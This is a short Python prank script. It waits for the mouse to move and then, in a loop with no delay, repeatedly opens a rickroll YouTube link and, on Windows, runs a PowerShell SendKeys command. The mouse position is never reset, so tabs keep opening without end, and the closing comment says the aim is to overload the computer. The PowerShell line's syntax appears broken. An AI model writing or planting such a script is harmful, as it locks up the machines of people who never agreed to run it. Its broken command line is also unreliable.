import pyautogui
import webbrowser
import os
import time
initial_position = pyautogui.position()
while True:
    if pyautogui.position() != initial_position:
        webbrowser.open('http://www.youtube.com/watch?v=dQw4w9WgXcQ') 
        if os.name == 'nt':
            os.system('powershell (New-Object -ComObject WScript.Shell).SendKeys((^ 100))')        
    time.sleep(0) # ALL GAS NO BREAK PC GO BOOM
       
